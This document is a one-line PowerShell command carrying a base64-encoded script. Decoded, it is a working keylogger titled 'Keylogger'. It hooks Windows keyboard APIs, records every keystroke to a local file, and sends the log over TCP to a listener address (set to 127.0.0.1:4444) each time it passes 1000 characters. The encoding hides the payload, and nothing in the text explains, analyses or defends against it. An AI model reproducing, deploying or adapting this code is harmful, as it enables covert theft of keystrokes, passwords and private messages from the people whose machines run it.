powershell -EncodedCommand "RnVuY3Rpb24gU2VuZC1UQ1BNZXNzYWdlIHsgCiAgICBQYXJhbSAoIAogICAgICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MCldCiAgICAgICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldIAogICAgICAgICAgICBbc3RyaW5nXSAKCQkJIyRFbmRQb2ludAoJCQkkSVAKICAgICAgICAsIAogICAgICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSldCiAgICAgICAgICAgIFtpbnRdCiAgICAgICAgICAgICRQb3J0CiAgICAgICAgLCAKICAgICAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIpXQogICAgICAgICAgICBbc3RyaW5nXQogICAgICAgICAgICAkTWVzc2FnZQogICAgKSAKICAgIFByb2Nlc3MgewogICAgICAgICMgU2V0dXAgY29ubmVjdGlvbiAKICAgICAgICAjJElQID0gW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3NlcygkRW5kUG9pbnQpIAogICAgICAgICRBZGRyZXNzID0gW1N5c3RlbS5OZXQuSVBBZGRyZXNzXTo6UGFyc2UoJElQKSAKICAgICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCRBZGRyZXNzLCRQb3J0KSAKICAgIAogICAgICAgICMgU2V0dXAgc3RyZWFtIHdydGllciAKICAgICAgICAkU3RyZWFtID0gJFNvY2tldC5HZXRTdHJlYW0oKSAKICAgICAgICAkV3JpdGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtV3JpdGVyKCRTdHJlYW0pCgogICAgICAgICMgV3JpdGUgbWVzc2FnZSB0byBzdHJlYW0KICAgICAgICAkTWVzc2FnZSB8ICUgewogICAgICAgICAgICAkV3JpdGVyLldyaXRlTGluZSgkXykKICAgICAgICAgICAgJFdyaXRlci5GbHVzaCgpCiAgICAgICAgfQogICAgCiAgICAgICAgIyBDbG9zZSBjb25uZWN0aW9uIGFuZCBzdHJlYW0KICAgICAgICAkU3RyZWFtLkNsb3NlKCkKICAgICAgICAkU29ja2V0LkNsb3NlKCkKICAgIH0KfQokVGl0bGUgPSAiS2V5bG9nZ2VyIgokaG9zdC5VSS5SYXdVSS5XaW5kb3dUaXRsZSA9ICRUaXRsZQojSW1wb3J0IGNoZWNraW5nIGtleSBzdGF0dXMuCiRTaWcxID0gQCcKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvLCBFeGFjdFNwZWxsaW5nPXRydWUpXSAKcHVibGljIHN0YXRpYyBleHRlcm4gc2hvcnQgR2V0QXN5bmNLZXlTdGF0ZShpbnQgdmlydHVhbEtleUNvZGUpOyAKJ0AKQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gJFNpZzEgLU5hbWUgS2V5Ym9hcmQgLU5hbWVzcGFjZSBQc09uZUFwaQoKI1NldCBvZiB3aW4tYXBpcyB0byBnZXQgImNvcnJlY3QgdmFsdWVzIiBmb3IgVG9Vbmljb2RlIC0gdG8gdHJhbnNsYXRlIGtleV9udW0gYmV0dGVyCiRTaWcyID0gQCcKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IE1hcFZpcnR1YWxLZXkodWludCB1Q29kZSwgaW50IHVNYXBUeXBlKTsKJ0AKJFNpZzMgPSBAJwpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8pXQpwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgR2V0S2V5Ym9hcmRTdGF0ZShieXRlW10ga2V5c3RhdGUpOwonQAokU2lnNCA9IEAnCltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBUb1VuaWNvZGUodWludCB3VmlydEtleSwgdWludCB3U2NhbkNvZGUsIGJ5dGVbXSBscGtleXN0YXRlLCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyIHB3c3pCdWZmLCBpbnQgY2NoQnVmZiwgdWludCB3RmxhZ3MpOwonQAojIE1hcCBWaXJ0dWFsIEtleQpBZGQtVHlwZSAtTWVtYmVyRGVmaW5pdGlvbiAkU2lnMiAtTmFtZSBNYXBWa2V5IC1OYW1lc3BhY2UgUHNPbmVBcGkKIyBNYXAgS2Vib2FyZCBTdGF0ZSBmb3IgbXVsdGkgYnV0dG9uIG9wZXJhdGlvbnMKQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gJFNpZzMgLU5hbWUgR2V0S0JTIC1OYW1lc3BhY2UgUHNPbmVBcGkKIyBUcmFuc2xhdGUga2V5IHRvIHVuaWNvZGUKQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gJFNpZzQgLU5hbWUgVG9VbmkgLU5hbWVzcGFjZSBQc09uZUFwaQokZmlsZSA9ICIuXG91dC50eHQiCiRyZXRfYWRkciA9ICIxMjcuMC4wLjEiCiRyZXRfcG9ydCA9IDQ0NDQKd2hpbGUoJHRydWUpewogICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA1CiAgICBmb3IgKCRrZXlfbnVtPTg7ICRrZXlfbnVtIC1sZSAyNTQ7ICRrZXlfbnVtKyspewogICAgICAgICRrZXlfcHJlc3NlZCA9IFtQc09uZUFwaS5LZXlib2FyZF06OkdldEFzeW5jS2V5U3RhdGUoJGtleV9udW0pCiAgICAgICAgaWYgKCRrZXlfcHJlc3NlZCAtZXEgLTMyNzY3KXsKICAgICAgICAgICAgI0dldCB2aXJ0dWFsIGtleSAoYWxzbyBkaWZmZXJlbnRpYXRlIGJldHdlZW4gcmlnaHQgYW5kIGxlZnQpCiAgICAgICAgICAgICNUaGUgbnVtYmVyIDMgLSBUaGUgdUNvZGUgcGFyYW1ldGVyIGlzIGEgc2NhbiBjb2RlIGFuZCBpcyB0cmFuc2xhdGVkIGludG8gYSB2aXJ0dWFsLWtleSBjb2RlIHRoYXQgZGlzdGluZ3Vpc2hlcyBiZXR3ZWVuIGxlZnQtIGFuZCByaWdodC1oYW5kIGtleXMuCiAgICAgICAgICAgICR2ayA9IFtQc09uZUFwaS5NYXBWa2V5XTo6TWFwVmlydHVhbEtleSgka2V5X251bSwzKQogICAgICAgICAgICAjR2V0IGtleSBzdGF0ZXMgdG8gY2hlY2sgZm9yIG11bHRpcHJlc3MKICAgICAgICAgICAgJGtiID0gTmV3LU9iamVjdCBCeXRlW10gMjU2CiAgICAgICAgICAgICRrYnMgPSBbUHNPbmVBcGkuR2V0S0JTXTo6R2V0S2V5Ym9hcmRTdGF0ZSgka2IpCiAgICAgICAgICAgICNUcmFuc2xhdGUgdG8gdW5pY29kZSAtIFVzZXMga2V5bnVtIHZrIGFuZCBrYnMgdG8gc2F2ZSB0aGUgdW5pY29kZSB0byB0X2NoYXIgKHRyYW5zbGF0ZWQgY2hhcikgKDAgaXMgZmxhZ3MgZm9yIG1lbnUpCiAgICAgICAgICAgICNCdWZmZXIgZm9yIGdyb3dpbmcgc3RyaW5nCiAgICAgICAgICAgICR0X2NoYXIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyCiAgICAgICAgICAgICMkdW5pX3Rlc3QgPSBbUHNPbmVBcGkuVG9VbmldOjpUb1VuaWNvZGUoODEsMzQsMSwkdF9jaGFyLCR0X2NoYXIuQ2FwYWNpdHksMCkKICAgICAgICAgICAgJHVuaV9vcGVyYXRpb24gPSBbUHNPbmVBcGkuVG9VbmldOjpUb1VuaWNvZGUoJGtleV9udW0sJHZrLCRrYiwkdF9jaGFyLCR0X2NoYXIuQ2FwYWNpdHksMCkKICAgICAgICAgICAgaWYgKCR1bmlfb3BlcmF0aW9uKXsKICAgICAgICAgICAgICAgICNTYXZpbmcgZXZlcnkga2V5IHRvIGZpbGUKICAgICAgICAgICAgICAgIEFkZC1Db250ZW50IC1QYXRoICRmaWxlIC1WYWx1ZSAkdF9jaGFyIC1Ob05ld0xpbmUKICAgICAgICAgICAgfQoJCQkkY29udGVudCA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxUZXh0KCRmaWxlKQoJCQkkbGVuZ3RoID0gJGNvbnRlbnQuTGVuZ3RoCgkJCSNXcml0ZS1Ib3N0ICRjb250ZW50ICRsZW5ndGgKCQkJaWYgKCRsZW5ndGggLWd0IDEwMDApewoJCQkJU2VuZC1UQ1BNZXNzYWdlIC1JUCAkcmV0X2FkZHIgLVBvcnQgJHJldF9wb3J0IC1NZXNzYWdlICRjb250ZW50CgkJCQlTZXQtQ29udGVudCAtUGF0aCAkZmlsZSAtVmFsdWUgIiIKCQkJfQogICAgICAgIH0KICAgIH0KfQo="